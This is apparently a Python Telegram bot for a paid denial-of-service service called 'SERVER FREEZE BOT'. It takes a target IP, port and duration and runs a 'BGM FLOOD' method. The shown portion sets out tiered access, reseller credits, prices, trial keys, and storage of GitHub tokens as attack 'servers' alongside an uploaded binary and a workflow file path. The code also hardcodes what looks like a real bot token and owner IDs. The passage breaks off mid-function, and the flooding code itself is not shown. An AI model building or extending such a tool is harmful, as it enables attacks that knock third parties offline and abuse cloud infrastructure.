import os
import json
import logging
import threading
import time
import random
import string
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from github import Github, GithubException

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8579474154:AAH16AmOzDPQGlCz14-D10PdZLWnrVTsssY"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "soul"
ADMIN_IDS = [8101867786]
OWNER_IDS = [8101867786]

WAITING_FOR_IP = 1
WAITING_FOR_PORT = 2
WAITING_FOR_TIME = 3
WAITING_FOR_BINARY = 4
WAITING_FOR_BROADCAST = 5
WAITING_FOR_USER_ID = 6
WAITING_FOR_DAYS = 7
WAITING_FOR_TOKEN = 8
WAITING_FOR_OWNER_ID = 9
WAITING_FOR_OWNER_USERNAME = 10
WAITING_FOR_RESELLER_ID = 11
WAITING_FOR_RESELLER_CREDITS = 12
WAITING_FOR_RESELLER_USERNAME = 13
WAITING_FOR_REMOVE_ID = 14
WAITING_FOR_COOLDOWN = 15
WAITING_FOR_MAX_ATTACKS = 16
WAITING_FOR_TRIAL_HOURS = 17
WAITING_FOR_REDEEM_KEY = 18

current_attack = None
attack_lock = threading.Lock()
cooldown_until = 0
COOLDOWN_DURATION = 40
MAINTENANCE_MODE = False
MAX_ATTACKS = 40
user_attack_counts = {}
user_states = {}

USER_PRICES = {"1": 120, "2": 240, "3": 360, "4": 450, "7": 650}
RESELLER_PRICES = {"1": 150, "2": 250, "3": 300, "4": 400, "7": 550}

# Load/Save Functions
def load_users():
    try:
        with open('users.json', 'r') as f:
            users_data = json.load(f)
            if not users_data:
                initial_users = ADMIN_IDS.copy()
                save_users(initial_users)
                return set(initial_users)
            return set(users_data)
    except FileNotFoundError:
        initial_users = ADMIN_IDS.copy()
        save_users(initial_users)
        return set(initial_users)

def save_users(users):
    with open('users.json', 'w') as f:
        json.dump(list(users), f, indent=2)

def load_pending_users():
    try:
        with open('pending_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_pending_users(pending_users):
    with open('pending_users.json', 'w') as f:
        json.dump(pending_users, f, indent=2)

def load_approved_users():
    try:
        with open('approved_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_approved_users(approved_users):
    with open('approved_users.json', 'w') as f:
        json.dump(approved_users, f, indent=2)

def load_owners():
    try:
        with open('owners.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        owners = {}
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {
                "username": f"owner_{admin_id}",
                "added_by": "system",
                "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "is_primary": True
            }
        save_owners(owners)
        return owners

def save_owners(owners):
    with open('owners.json', 'w') as f:
        json.dump(owners, f, indent=2)

def load_admins():
    try:
        with open('admins.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_admins(admins):
    with open('admins.json', 'w') as f:
        json.dump(admins, f, indent=2)

def load_groups():
    try:
        with open('groups.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_groups(groups):
    with open('groups.json', 'w') as f:
        json.dump(groups, f, indent=2)

def load_resellers():
    try:
        with open('resellers.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_resellers(resellers):
    with open('resellers.json', 'w') as f:
        json.dump(resellers, f, indent=2)

def load_github_tokens():
    try:
        with open('github_tokens.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_github_tokens(tokens):
    with open('github_tokens.json', 'w') as f:
        json.dump(tokens, f, indent=2)

def load_attack_state():
    try:
        with open('attack_state.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {"current_attack": None, "cooldown_until": 0}

def save_attack_state():
    state = {"current_attack": current_attack, "cooldown_until": cooldown_until}
    with open('attack_state.json', 'w') as f:
        json.dump(state, f, indent=2)

def load_maintenance_mode():
    try:
        with open('maintenance.json', 'r') as f:
            data = json.load(f)
            return data.get("maintenance", False)
    except FileNotFoundError:
        return False

def save_maintenance_mode(mode):
    with open('maintenance.json', 'w') as f:
        json.dump({"maintenance": mode}, f, indent=2)

def load_cooldown():
    try:
        with open('cooldown.json', 'r') as f:
            data = json.load(f)
            return data.get("cooldown", 40)
    except FileNotFoundError:
        return 40

def save_cooldown(duration):
    with open('cooldown.json', 'w') as f:
        json.dump({"cooldown": duration}, f, indent=2)

def load_max_attacks():
    try:
        with open('max_attacks.json', 'r') as f:
            data = json.load(f)
            return data.get("max_attacks", 40)
    except FileNotFoundError:
        return 40

def save_max_attacks(max_attacks):
    with open('max_attacks.json', 'w') as f:
        json.dump({"max_attacks": max_attacks}, f, indent=2)

def load_trial_keys():
    try:
        with open('trial_keys.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_trial_keys(keys):
    with open('trial_keys.json', 'w') as f:
        json.dump(keys, f, indent=2)

users = load_users()
approved_users = load_approved_users()
owners = load_owners()
admins = load_admins()
resellers = load_resellers()
github_tokens = load_github_tokens()
trial_keys = load_trial_keys()
groups = load_groups()

MAINTENANCE_MODE = load_maintenance_mode()
COOLDOWN_DURATION = load_cooldown()
MAX_ATTACKS = load_max_attacks()
attack_state = load_attack_state()
current_attack = attack_state.get("current_attack")
cooldown_until = attack_state.get("cooldown_until", 0)

logger.info("✅ Part 1: Configurations loaded")
# Part 2: Helper Functions and Check Functions

def is_owner(user_id):
    return str(user_id) in owners

def is_admin(user_id):
    return str(user_id) in admins

def is_reseller(user_id):
    return str(user_id) in resellers

def is_approved_user(user_id):
    if str(user_id) in approved_users:
        expiry_str = approved_users[str(user_id)].get('expiry_date')
        if expiry_str:
            try:
                expiry = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
                if datetime.now() < expiry:
                    return True
                else:
                    del approved_users[str(user_id)]
                    save_approved_users(approved_users)
                    return False
            except:
                return False
    return False

def has_access(user_id):
    return is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id)

def format_time_remaining(expiry_str):
    try:
        expiry = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
        remaining = expiry - datetime.now()
        if remaining.days > 0:
            return f"{remaining.days} days left"
        elif remaining.seconds > 3600:
            hours = remaining.seconds // 3600
            return f"{hours} hours left"
        elif remaining.seconds > 60:
            minutes = remaining.seconds // 60
            return f"{minutes} minutes left"
        else:
            return "Expired"
    except:
        return "N/A"

# Keyboard Functions
def get_main_keyboard(user_id):
    keyboard = []
    
    if not has_access(user_id):
        keyboard.append([InlineKeyboardButton("🔓 Request Access", callback_data="request_access")])
        keyboard.append([InlineKeyboardButton("🎁 Redeem Key", callback_data="redeem_key")])
    else:
        keyboard.append([InlineKeyboardButton("⚔️ Launch Attack", callback_data="start_attack")])
        keyboard.append([InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack"),
                        InlineKeyboardButton("📊 Check Status", callback_data="attack_status")])
    
    if is_owner(user_id):
        keyboard.append([InlineKeyboardButton("👑 Owner Panel", callback_data="owner_panel")])
    
    if is_admin(user_id):
        keyboard.append([InlineKeyboardButton("🛡️ Admin Panel", callback_data="admin_panel")])
    
    if is_reseller(user_id):
        keyboard.append([InlineKeyboardButton("💰 Reseller Panel", callback_data="reseller_panel")])
    
    keyboard.append([InlineKeyboardButton("📌 My Access", callback_data="my_account"),
                    InlineKeyboardButton("❓ Help", callback_data="help")])
    
    return InlineKeyboardMarkup(keyboard)

def get_owner_panel_keyboard():
    keyboard = [
        [InlineKeyboardButton("👥 User Management", callback_data="owner_users")],
        [InlineKeyboardButton("🛡️ Admin Management", callback_data="owner_admins")],
        [InlineKeyboardButton("💰 Reseller Management", callback_data="owner_resellers")],
        [InlineKeyboardButton("🔑 Token Management", callback_data="owner_servers")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="owner_broadcast")],
        [InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_admin_panel_keyboard():
    keyboard = [
        [InlineKeyboardButton("📝 Pending Requests", callback_data="pending_requests")],
        [InlineKeyboardButton("👥 User List", callback_data="list_users")],
        [InlineKeyboardButton("🎁 Generate Trial Key", callback_data="admin_genkey")],
        [InlineKeyboardButton("📊 Statistics", callback_data="admin_stats")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_reseller_panel_keyboard():
    keyboard = [
        [InlineKeyboardButton("➕ Add User", callback_data="reseller_add")],
        [InlineKeyboardButton("➖ Remove User", callback_data="reseller_remove")],
        [InlineKeyboardButton("👥 My Users", callback_data="reseller_myusers")],
        [InlineKeyboardButton("💳 My Credits", callback_data="reseller_credits")],
        [InlineKeyboardButton("💰 Prices", callback_data="reseller_prices")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_user_management_keyboard():
    keyboard = [
        [InlineKeyboardButton("➕ Add User", callback_data="add_user")],
        [InlineKeyboardButton("➖ Remove User", callback_data="remove_user")],
        [InlineKeyboardButton("👥 User List", callback_data="list_users")],
        [InlineKeyboardButton("📝 Pending Requests", callback_data="pending_requests")],
        [InlineKeyboardButton("🔙 Back", callback_data="owner_panel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_admin_management_keyboard():
    keyboard = [
        [InlineKeyboardButton("➕ Add Admin", callback_data="add_admin")],
        [InlineKeyboardButton("➖ Remove Admin", callback_data="remove_admin")],
        [InlineKeyboardButton("🛡️ Admin List", callback_data="list_admins")],
        [InlineKeyboardButton("🔙 Back", callback_data="owner_panel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_reseller_management_keyboard():
    keyboard = [
        [InlineKeyboardButton("➕ Add Reseller", callback_data="add_reseller")],
        [InlineKeyboardButton("➖ Remove Reseller", callback_data="remove_reseller")],
        [InlineKeyboardButton("💳 Add Credits", callback_data="add_reseller_credits")],
        [InlineKeyboardButton("💰 Reseller List", callback_data="list_resellers")],
        [InlineKeyboardButton("🔙 Back", callback_data="owner_panel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_server_management_keyboard():
    keyboard = [
        [InlineKeyboardButton("➕ Add Server", callback_data="add_server")],
        [InlineKeyboardButton("➖ Remove Server", callback_data="remove_server")],
        [InlineKeyboardButton("🔑 Server List", callback_data="list_servers")],
        [InlineKeyboardButton("📤 Upload Binary", callback_data="upload_binary")],
        [InlineKeyboardButton("🔙 Back", callback_data="owner_panel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_settings_keyboard():
    maintenance_text = "🔴 Disable" if MAINTENANCE_MODE else "🟢 Enable"
    keyboard = [
        [InlineKeyboardButton("⏱️ Set Cooldown", callback_data="set_cooldown")],
        [InlineKeyboardButton("🎯 Set Max Attacks", callback_data="set_max_attacks")],
        [InlineKeyboardButton(f"{maintenance_text} Maintenance", callback_data="toggle_maintenance")],
        [InlineKeyboardButton("🎁 Generate Trial Key", callback_data="gen_trial_key")],
        [InlineKeyboardButton("🔙 Back", callback_data="owner_panel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_attack_panel_keyboard():
    keyboard = [
        [InlineKeyboardButton("🚀 Launch Attack", callback_data="start_attack")],
        [InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack")],
        [InlineKeyboardButton("📊 Check Status", callback_data="attack_status")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_cancel_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]])

def get_back_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]])

logger.info("✅ Part 2: Helper functions loaded")

# Part 3: Command Handlers

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id if update.effective_user else None
    
    if not user_id:
        return
    
    if update.callback_query:
        query = update.callback_query
        username = query.from_user.username or query.from_user.first_name or "User"
        
        text = f"""
🔥 **SERVER FREEZE BOT** 🔥

Welcome back, {username}!

Select an option below:
"""
        
        keyboard = get_main_keyboard(user_id)
        await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
    else:
        username = update.effective_user.username or update.effective_user.first_name or "User"
        
        # Notify owners of new user starting bot
        if not has_access(user_id):
            pending = load_pending_users()
            already_pending = any(req.get('user_id') == user_id for req in pending)
            
            if not already_pending:
                for owner_id in owners.keys():
                    try:
                        await context.bot.send_message(
                            chat_id=int(owner_id),
                            text=f"📢 **NEW USER STARTED BOT**\n\n"
                                 f"👤 Username: @{username}\n"
                                 f"🆔 ID: `{user_id}`\n"
                                 f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                                 f"User needs to request access.",
                            parse_mode='Markdown'
                        )
                    except:
                        pass
        
        text = f"""
🔥 **SERVER FREEZE BOT** 🔥

Welcome, {username}!

🎯 **Method**: BGM FLOOD
⚡ **Cooldown**: {COOLDOWN_DURATION}s
🔥 **Max attacks**: {MAX_ATTACKS}

Select an option:
"""
        
        keyboard = get_main_keyboard(user_id)
        await update.message.reply_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = """
❓ **HELP & COMMANDS**

**User Commands:**
/start - Start the bot
/help - Show this help
/myaccess - Check access status
/status - Check attack status
/stop - Stop attack
/redeem <key> - Redeem trial key

**Attack:**
• Launch via buttons
• Real-time status
• Stop anytime

**Access:**
Request access or redeem key

**Support:**
Contact owner
"""
    
    if update.callback_query:
        query = update.callback_query
        keyboard = get_back_keyboard()
        await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
    else:
        await update.message.reply_text(text, parse_mode='Markdown')

async def id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "No username"
    
    text = f"""
👤 **YOUR INFORMATION**

🆔 User ID: `{user_id}`
👤 Username: @{username}
📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
    
    await update.message.reply_text(text, parse_mode='Markdown')

async def myaccess_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    text = "📌 **YOUR ACCESS**\n\n"
    
    if is_owner(user_id):
        owner_data = owners[str(user_id)]
        text += f"👑 **Role**: Owner\n"
        text += f"✅ **Status**: Full Access\n"
        text += f"📅 **Since**: {owner_data.get('added_date', 'N/A')}\n"
    elif is_admin(user_id):
        admin_data = admins[str(user_id)]
        text += f"🛡️ **Role**: Admin\n"
        text += f"✅ **Status**: Active\n"
        text += f"📅 **Since**: {admin_data.get('added_date', 'N/A')}\n"
    elif is_reseller(user_id):
        reseller_data = resellers[str(user_id)]
        text += f"💰 **Role**: Reseller\n"
        text += f"💳 **Credits**: {reseller_data.get('credits', 0)} days\n"
        text += f"👥 **Users Added**: {reseller_data.get('users_added', 0)}\n"
        text += f"📅 **Since**: {reseller_data.get('added_date', 'N/A')}\n"
    elif is_approved_user(user_id):
        user_data = approved_users[str(user_id)]
        text += f"✅ **Status**: Active User\n"
        text += f"⏰ **Expires**: {format_time_remaining(user_data['expiry_date'])}\n"
        text += f"📅 **Added**: {user_data.get('added_date', 'N/A')}\n"
        text += f"📋 **Plan**: {user_data.get('plan', 'N/A')}\n"
    else:
        text += "❌ **Status**: No Access\n\n"
        text += "Use /start to request access or redeem a key."
    
    await update.message.reply_text(text, parse_mode='Markdown')

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack, cooldown_until
    
    text = "📊 **ATTACK STATUS**\n\n"
    
    if MAINTENANCE_MODE:
        text += "🔧 **Status**: Maintenance Mode\n"
        text += "All attacks disabled.\n"
    elif current_attack:
        text += f"🚀 **Status**: Attack Running\n"
        text += f"🎯 **Target**: `{current_attack.get('target')}`\n"
        text += f"🔌 **Port**: `{current_attack.get('port')}`\n"
        text += f"⏱️ **Duration**: {current_attack.get('duration')}s\n"
        text += f"👤 **User**: {current_attack.get('user_id')}\n"
    elif cooldown_until > time.time():
        remaining = int(cooldown_until - time.time())
        text += f"⏳ **Status**: Cooldown\n"
        text += f"⏱️ **Remaining**: {remaining}s\n"
    else:
        text += "✅ **Status**: Ready\n"
        text += "No active attacks.\n"
    
    text += f"\n🔑 **Servers**: {len(github_tokens)}\n"
    text += f"⏳ **Cooldown**: {COOLDOWN_DURATION}s\n"
    
    if update.callback_query:
        query = update.callback_query
        keyboard = get_back_keyboard()
        await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
    else:
        await update.message.reply_text(text, parse_mode='Markdown')

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack
    user_id = update.effective_user.id
    
    if not has_access(user_id):
        await update.message.reply_text("❌ **ACCESS DENIED**\n\nYou need access to use this command.")
        return
    
    if not current_attack:
        await update.message.reply_text("⚠️ No active attack to stop.")
        return
    
    if is_owner(user_id) or is_admin(user_id) or current_attack.get('user_id') == user_id:
        current_attack = None
        save_attack_state()
        await update.message.reply_text("✅ **ATTACK STOPPED**\n\nAttack has been terminated.")
    else:
        await update.message.reply_text("❌ You can only stop your own attacks.")

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not context.args:
        await update.message.reply_text("❌ **INVALID USAGE**\n\nUsage: /redeem <key>")
        return
    
    key = context.args[0]
    
    if key not in trial_keys:
        await update.message.reply_text("❌ **INVALID KEY**\n\nThe key doesn't exist or has expired.")
        return
    
    key_data = trial_keys[key]
    
    if key_data.get('used'):
        await update.message.reply_text("❌ **KEY USED**\n\nThis key has already been redeemed.")
        return
    
    hours = key_data.get('hours', 24)
    expiry = datetime.now() + timedelta(hours=hours)
    
    approved_users[str(user_id)] = {
        "username": update.effective_user.username or f"user_{user_id}",
        "expiry_date": expiry.strftime("%Y-%m-%d %H:%M:%S"),
        "added_by": "trial_key",
        "added_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "plan": f"{hours}h trial"
    }
    
    trial_keys[key]['used'] = True
    trial_keys[key]['used_by'] = user_id
    trial_keys[key]['used_date'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    save_approved_users(approved_users)
    save_trial_keys(trial_keys)
    
    text = f"""
✅ **KEY REDEEMED!**

⏰ **Duration**: {hours} hours
📅 **Expires**: {expiry.strftime('%Y-%m-%d %H:%M:%S')}

Use /start to begin!
"""
    
    await update.message.reply_text(text, parse_mode='Markdown')

logger.info("✅ Part 3: Command handlers loaded")

# Part 4: Button/Callback Handlers and Panel Functions

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    # Main navigation
    if data == "main_menu":
        await start(update, context)
    elif data == "help":
        await help_command(update, context)
    
    # Access control panels
    elif data == "owner_panel":
        if not is_owner(user_id):
            await query.answer("❌ ACCESS DENIED - Owner only!", show_alert=True)
            return
        await show_owner_panel(query)
    
    elif data == "admin_panel":
        if not is_admin(user_id):
            await query.answer("❌ ACCESS DENIED - Admin only!", show_alert=True)
            return
        await show_admin_panel(query)
    
    elif data == "reseller_panel":
        if not is_reseller(user_id):
            await query.answer("❌ ACCESS DENIED - Reseller only!", show_alert=True)
            return
        await show_reseller_panel(query)
    
    # Attack panel and actions
    elif data == "start_attack":
        if not has_access(user_id):
            await query.answer("❌ NO ACCESS - Request access first!", show_alert=True)
            return
        await init_attack(query, user_id, context)
    
    elif data == "stop_attack":
        if not has_access(user_id):
            await query.answer("❌ NO ACCESS - You need access!", show_alert=True)
            return
        await stop_attack_callback(query, user_id)
    
    elif data == "attack_status":
        await status_command(update, context)
    
    # Management panels
    elif data == "owner_users":
        await show_user_management(query)
    elif data == "owner_admins":
        await show_admin_management(query)
    elif data == "owner_resellers":
        await show_reseller_management(query)
    elif data == "owner_servers":
        await show_server_management(query)
    elif data == "settings":
        await show_settings(query)
    
    # Pending requests
    elif data == "pending_requests":
        if not (is_owner(user_id) or is_admin(user_id)):
            await query.answer("❌ ACCESS DENIED!", show_alert=True)
            return
        await show_pending_requests(query, context)
    
    # User management
    elif data == "add_user":
        await init_add_user(query, user_id)
    elif data == "remove_user":
        await init_remove_user(query, user_id)
    elif data == "list_users":
        await show_users_list(query)
    
    # Server management
    elif data == "add_server":
        await init_add_server(query, user_id)
    elif data == "remove_server":
        await init_remove_server(query, user_id)
    elif data == "list_servers":
        await show_servers_list(query)
    elif data == "upload_binary":
        await init_upload_binary(query, user_id)
    
    # Settings
    elif data == "set_cooldown":
        await init_set_cooldown(query, user_id)
    elif data == "set_max_attacks":
        await init_set_max_attacks(query, user_id)
    elif data == "toggle_maintenance":
        await toggle_maintenance(query, user_id)
    elif data == "gen_trial_key" or data == "admin_genkey":
        await init_gen_trial_key(query, user_id)
    
    # Admin management
    elif data == "add_admin":
        await init_add_admin(query, user_id)
    elif data == "remove_admin":
        await init_remove_admin(query, user_id)
    elif data == "list_admins":
        await show_admins_list(query)
    
    # Reseller management
    elif data == "add_reseller":
        await init_add_reseller(query, user_id)
    elif data == "remove_reseller":
        await init_remove_reseller(query, user_id)
    elif data == "add_reseller_credits":
        await init_add_reseller_credits(query, user_id)
    elif data == "list_resellers":
        await show_resellers_list(query)
    
    # Reseller actions
    elif data == "reseller_add":
        await init_reseller_add_user(query, user_id)
    elif data == "reseller_remove":
        await init_reseller_remove_user(query, user_id)
    elif data == "reseller_myusers":
        await show_reseller_users(query, user_id)
    elif data == "reseller_credits":
        await show_reseller_credits(query, user_id)
    elif data == "reseller_prices":
        await show_reseller_prices(query)
    
    # User actions
    elif data == "request_access":
        await request_access(query, user_id, context)
    elif data == "redeem_key":
        await init_redeem_key(query, user_id)
    elif data == "my_account":
        await show_my_account(query, user_id)
    
    # Broadcast
    elif data == "owner_broadcast":
        await start_broadcast(query, user_id)
    
    # Statistics
    elif data == "statistics" or data == "admin_stats":
        await show_statistics(query)
    
    # Approve/reject requests
    elif data.startswith("approve_"):
        req_user_id = int(data.split("_")[1])
        await approve_request(query, user_id, req_user_id)
    elif data.startswith("reject_"):
        req_user_id = int(data.split("_")[1])
        await reject_request(query, user_id, req_user_id)
    
    # Cancel
    elif data == "cancel":
        user_states[user_id] = None
        await query.edit_message_text("❌ Operation cancelled.", reply_markup=get_back_keyboard())

# Panel display functions
async def show_owner_panel(query):
    text = f"""
👑 **OWNER PANEL**

Welcome to owner control panel.

🔑 Servers: {len(github_tokens)}
👥 Users: {len(approved_users)}
💰 Resellers: {len(resellers)}
🛡️ Admins: {len(admins)}
"""
    keyboard = get_owner_panel_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_admin_panel(query):
    pending_count = len(load_pending_users())
    text = f"""
🛡️ **ADMIN PANEL**

Manage users and requests.

👥 Users: {len(approved_users)}
📝 Pending: {pending_count}
"""
    keyboard = get_admin_panel_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_reseller_panel(query):
    user_id = query.from_user.id
    reseller_data = resellers[str(user_id)]
    text = f"""
💰 **RESELLER PANEL**

Welcome, {query.from_user.username or 'Reseller'}!

💳 Credits: {reseller_data.get('credits', 0)} days
👥 Users Added: {reseller_data.get('users_added', 0)}
"""
    keyboard = get_reseller_panel_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_user_management(query):
    text = """
👥 **USER MANAGEMENT**

Manage approved users and requests.
"""
    keyboard = get_user_management_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_admin_management(query):
    text = f"""
🛡️ **ADMIN MANAGEMENT**

Total Admins: {len(admins)}
"""
    keyboard = get_admin_management_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_reseller_management(query):
    text = f"""
💰 **RESELLER MANAGEMENT**

Total Resellers: {len(resellers)}
"""
    keyboard = get_reseller_management_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_server_management(query):
    text = f"""
🔑 **SERVER MANAGEMENT**

Total Servers: {len(github_tokens)}
"""
    keyboard = get_server_management_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_settings(query):
    text = f"""
⚙️ **SYSTEM SETTINGS**

⏱️ Cooldown: {COOLDOWN_DURATION}s
🎯 Max Attacks: {MAX_ATTACKS}
🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}
"""
    keyboard = get_settings_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_statistics(query):
    text = f"""
📊 **BOT STATISTICS**

👥 Users: {len(approved_users)}
🛡️ Admins: {len(admins)}
💰 Resellers: {len(resellers)}
🔑 Servers: {len(github_tokens)}
📝 Pending: {len(load_pending_users())}
"""
    keyboard = get_back_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_my_account(query, user_id):
    text = "📌 **YOUR ACCESS**\n\n"
    
    if is_owner(user_id):
        owner_data = owners[str(user_id)]
        text += f"👑 Role: Owner\n"
        text += f"✅ Status: Full Access\n"
        text += f"📅 Since: {owner_data.get('added_date', 'N/A')}\n"
    elif is_admin(user_id):
        admin_data = admins[str(user_id)]
        text += f"🛡️ Role: Admin\n"
        text += f"✅ Status: Active\n"
        text += f"📅 Since: {admin_data.get('added_date', 'N/A')}\n"
    elif is_reseller(user_id):
        reseller_data = resellers[str(user_id)]
        text += f"💰 Role: Reseller\n"
        text += f"💳 Credits: {reseller_data.get('credits', 0)} days\n"
        text += f"👥 Users: {reseller_data.get('users_added', 0)}\n"
    elif is_approved_user(user_id):
        user_data = approved_users[str(user_id)]
        text += f"✅ Status: Active\n"
        text += f"⏰ Expires: {format_time_remaining(user_data['expiry_date'])}\n"
        text += f"📋 Plan: {user_data.get('plan', 'N/A')}\n"
    else:
        text += "❌ Status: No Access\n"
    
    keyboard = get_back_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

logger.info("✅ Part 4: Button handlers loaded")

# Part 5: Action Functions (Attack, Requests, Management)

async def init_attack(query, user_id, context):
    global current_attack, cooldown_until
    
    if MAINTENANCE_MODE:
        await query.answer("🔧 Maintenance mode active!", show_alert=True)
        return
    
    if current_attack:
        await query.answer("⚠️ Attack already running!", show_alert=True)
        return
    
    if cooldown_until > time.time():
        remaining = int(cooldown_until - time.time())
        await query.answer(f"⏳ Cooldown: {remaining}s left", show_alert=True)
        return
    
    if not github_tokens:
        await query.answer("❌ No servers available!", show_alert=True)
        return
    
    user_states[user_id] = {"state": WAITING_FOR_IP, "action": "attack", "data": {}}
    
    await query.edit_message_text(
        "🎯 **LAUNCH ATTACK**\n\nEnter target IP address:",
        reply_markup=get_cancel_keyboard()
    )

async def stop_attack_callback(query, user_id):
    global current_attack
    
    if not current_attack:
        await query.answer("⚠️ No active attack", show_alert=True)
        return
    
    if is_owner(user_id) or is_admin(user_id) or current_attack.get('user_id') == user_id:
        current_attack = None
        save_attack_state()
        await query.answer("✅ Attack stopped!", show_alert=True)
        await query.edit_message_text("✅ **ATTACK STOPPED**", reply_markup=get_back_keyboard())
    else:
        await query.answer("❌ Only your own attacks!", show_alert=True)

async def show_pending_requests(query, context):
    pending = load_pending_users()
    
    if not pending:
        text = "📭 **NO PENDING REQUESTS**"
        keyboard = get_back_keyboard()
        await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
        return
    
    text = "📝 **PENDING REQUESTS**\n\n"
    
    for i, req in enumerate(pending[:10], 1):
        req_user_id = req['user_id']
        username = req.get('username', 'Unknown')
        date = req.get('date', 'N/A')
        text += f"{i}. @{username}\n   🆔 {req_user_id}\n   📅 {date}\n\n"
    
    if len(pending) > 10:
        text += f"... and {len(pending) - 10} more"
    
    text += f"\n📊 Total: {len(pending)}"
    
    keyboard = []
    for req in pending[:10]:
        req_user_id = req['user_id']
        username = req.get('username', 'Unknown')[:15]
        keyboard.append([
            InlineKeyboardButton(f"✅ {username}", callback_data=f"approve_{req_user_id}"),
            InlineKeyboardButton(f"❌ {username}", callback_data=f"reject_{req_user_id}")
        ])
    
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="owner_panel" if is_owner(query.from_user.id) else "admin_panel")])
    
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def request_access(query, user_id, context):
    pending = load_pending_users()
    
    if any(req['user_id'] == user_id for req in pending):
        await query.edit_message_text(
            "⚠️ **REQUEST ALREADY SENT**\n\nPending approval.",
            reply_markup=get_back_keyboard(),
            parse_mode='Markdown'
        )
        return
    
    if is_approved_user(user_id):
        await query.edit_message_text(
            "✅ **YOU HAVE ACCESS**",
            reply_markup=get_back_keyboard(),
            parse_mode='Markdown'
        )
        return
    
    username = query.from_user.username or f"user_{user_id}"
    
    pending.append({
        "user_id": user_id,
        "username": username,
        "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "first_name": query.from_user.first_name or "Unknown"
    })
    
    save_pending_users(pending)
    
    await query.edit_message_text(
        "✅ **REQUEST SENT!**\n\nWait for approval.\n\n🆔 Your ID: `" + str(user_id) + "`",
        reply_markup=get_back_keyboard(),
        parse_mode='Markdown'
    )
    
    # FIXED: Notify all owners
    for owner_id in owners.keys():
        try:
            await context.bot.send_message(
